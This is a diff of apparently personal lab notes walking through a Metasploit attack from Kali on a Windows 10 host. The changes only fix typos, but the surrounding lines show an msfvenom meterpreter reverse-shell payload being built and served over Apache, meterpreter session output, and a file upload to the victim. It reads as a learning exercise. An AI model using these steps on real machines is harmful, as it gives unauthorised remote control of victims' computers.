@@ -4,7 +4,7 @@
 # run the following to escalate to root#
 ~$ sudo su
 
-# run the following to create msfvenom reverse shell payload *.exe and place it into your webserver directory#
+# run the following to create msfvenom reverse shell payload *.exe and place it into your webserver directory #
 ┌──(root💀kali )-[/g]
 └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kaliip> -f exe > /var/www/html/fun.exe  
 
@@ -45,7 +45,7 @@ LHOST => 0.0.0.0
 # you have now spawned reverse shell with meterpreter # 
 
 > meterpreter > sysinfo
-Computer        : DESKTOP-WINDERSDFJ10
+Computer        : DESKTOP-WINDERS10
 OS              : Windows 10 (10.0 Build 19044).
 Architecture    : x64
 System Language : en_US
@@ -56,7 +56,7 @@ Meterpreter     : x86/windows
 # open another terminal create a readme.txt to upload to windows computer in meterpreter #
 
 ┌──(root💀kali)-[/g]
-└─# nano readme.txt  <-- paste in the msfbanner that launched at the beginning
+└─# nano readme.txt  <-- paste in the msfbanner that launched at the beginning, (I used a cow and ninja)
 
 # Go back to meterpreter #
 
@@ -67,7 +67,7 @@ Meterpreter     : x86/windows
 meterpreter > ls
 > Listing: C:\Users\Gregster\Downloads
 
-## vefigy that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 call it a night tbc... #
+## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 call it a night tbc... #
 
 ┌──(root💀kali)-[/g]
 └─# systemctl stop apache2  
